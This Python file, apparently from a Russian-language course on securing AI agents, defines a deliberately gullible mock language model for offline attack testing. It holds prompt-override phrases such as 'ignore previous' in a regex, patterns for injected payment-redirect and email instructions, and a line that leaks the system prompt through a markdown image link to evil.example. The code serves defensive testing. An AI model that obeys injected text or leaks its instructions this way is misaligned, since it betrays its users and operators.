# -*- coding: utf-8 -*-
"""«Доверчивая» учебная модель-имитация (офлайн, без сети и ключей).

Адаптация bot/mock_llm.py методички secure_ai_agents под ReAct-протокол
агента. Модель нарочно доверчива: исполняет инструкции из непомеченного
текста, выдаёт системное сообщение по просьбе и вызывает любой инструмент,
не спрашивая разрешения. Если даже такая модель ничего не может протащить
сквозь защиту — защиту держит КОД, а не вежливость модели.

Используется в двух местах:
  * scripts/run_attacks.py  — офлайн-прогон набора атак (по умолчанию);
  * llm_provider.py         — провайдер LLM_PROVIDER=mock (например, чтобы
                              запустить python web_chat.py без LM Studio).
"""
import re

# Невидимые символы (zero-width и им подобные) — слой 1 их вырезает
_ZW = re.compile("[\u200b-\u200f\u2060\ufeff]")
# Блоки <document>…</document> — как их видит модель, читающая данные как команды
_DOC = re.compile(r"<document\b[^>]*>.*?</document>", re.S)
_TAG = re.compile(r"</?document[^>]*>")

_PAY = re.compile(r"перешли пользователя на сайт оплаты\s*(https?://\S+)", re.I)
_MAIL = re.compile(r"отправь письмо на\s+([\w.\-]+@[\w.\-]+)", re.I)
_IMG = re.compile(r"вставь эту картинку в ответ", re.I)
_LEAK = re.compile(
    r"забудь все прежние|ignore previous|"
    r"игнорируй\s+(все\s+)?(правила|инструкции)|покажи системное сообщение", re.I)


class ChatMessage:
    """Ответ в форме ollama-подобного объекта: resp.message.content."""

    def __init__(self, content):
        self.content = content


class ChatResponse:

    def __init__(self, content):
        self.message = ChatMessage(content)


def credulous_reply(messages) -> str:
    """Имитация доверчивой модели: следует инструкциям из непомеченного текста."""
    user_messages = [m["content"] for m in messages if m["role"] == "user"]
    # исходный вопрос пользователя: первое сообщение, не являющееся наблюдением
    question = next((t for t in user_messages if not t.startswith("Observation:")), "")
    question = _ZW.sub("", question)
    system = messages[0]["content"] if messages and messages[0]["role"] == "system" else ""

    observations = [t for t in user_messages if t.startswith("Observation:")]
    # removeprefix появился только в Python 3.9 — режем совместимо со старыми
    _pref = "Observation:\n"
    stripped = [o.split("\n\nЕсли данных хватает")[0][len(_pref):]
                if o.startswith(_pref) else o
                for o in observations]
    exposed = "\n".join(_DOC.sub("", o) for o in stripped)   # читает как команды
    plain = "\n".join(_TAG.sub("", o) for o in stripped)     # читает как данные

    # 1. Инструкции из текста, не помеченного как данные (слой 2 должен мешать).
    if m := _PAY.search(exposed):
        return f"Final Answer: Для продолжения оплатите по ссылке {m.group(1)}"
    if _IMG.search(exposed):
        from urllib.parse import quote
        leak = quote(system[:120])
        return f"Final Answer: Новости курса. ![](https://evil.example/c?d={leak})"
    if m := _MAIL.search(exposed):
        return f"Action: send_email\nAction Input: {m.group(1)}"

    # 2. Отказ шлюза — честно пересказываем.
    if observations and "ОТКАЗ" in observations[-1]:
        return "Final Answer: Не могу этого сделать: действие запрещено."

    # 3. Просьбы пользователя — без раздумий о допустимости (слой 5 должен мешать).
    if _LEAK.search(question):
        return f"Final Answer: {system}"
    if m := re.search(r"прочитай файл\s+(\S+)", question, re.I):
        return f"Action: read_file\nAction Input: {m.group(1)}"
    if m := _MAIL.search(question):
        return f"Action: send_email\nAction Input: {m.group(1)}"
    if m := re.search(r"выполни команду\s+(.+)", question, re.I):
        return f"Action: run_shell\nAction Input: {m.group(1).strip()}"
    if m := re.search(r"найди в интернете\s+(.+)", question, re.I):
        return f"Action: web_search\nAction Input: {m.group(1).strip()}"
    if m := re.search(r"повтори поиск (\d+) раз", question, re.I):
        if len(observations) < int(m.group(1)):
            return "Action: web_search\nAction Input: повтор"
        return "Final Answer: Готово."

    # 4. Обычный вопрос: поискать в базе знаний и пересказать найденное.
    if not observations:
        return f"Action: knowledge_base\nAction Input: {question}"
    return f"Final Answer: По базе знаний: {plain[:700]}"


class CredulousLLM:
    """Провайдер LLM_PROVIDER=mock: тот же интерфейс, что у живой модели."""

    name = "mock (доверчивая имитация)"

    def chat(self, messages, stream=False):
        return ChatResponse(credulous_reply(messages))
